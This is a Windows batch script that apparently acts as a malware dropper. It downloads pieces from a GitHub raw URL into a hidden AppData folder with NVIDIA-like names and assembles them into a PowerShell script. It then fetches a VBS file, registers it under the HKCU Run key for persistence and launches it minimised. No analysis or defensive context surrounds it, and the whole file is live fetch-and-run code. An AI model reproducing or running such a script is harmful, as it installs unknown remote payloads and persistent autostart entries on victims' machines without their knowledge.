��@echo off
set d=%APPDATA%\nvd_s\dt
set f=%d%\n_main.txt
set a=%d%\p1.txt
set b=%d%\p2.txt
set c=%d%\NVD_S.PS1
set v=%d%\strt_n.vbs
set u=raw.githubusercontent.com/USATIKTOKER/service/main
rmdir /s /q "%d%" 2>nul
mkdir "%d%"
powershell -c "Start-BitsTransfer https://%u%/final.txt '%f%'"
powershell -c "Start-BitsTransfer https://%u%/first.txt '%a%'"
powershell -c "Start-BitsTransfer **** '%b%'"
powershell -c "(gc '%f%' -Raw) -replace '----',(gc '%a%' -Raw) -replace '====',(gc '%b%' -Raw) | sc '%c%'"
del "%a%" "%b%" 2>nul
powershell -c "iwr https://%u%/s-nvs_update.vbs -OutFile '%v%'"
powershell -c "sp 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' NvdS 'wscript.exe \"%v%\"'"
start /min wscript "%v%"
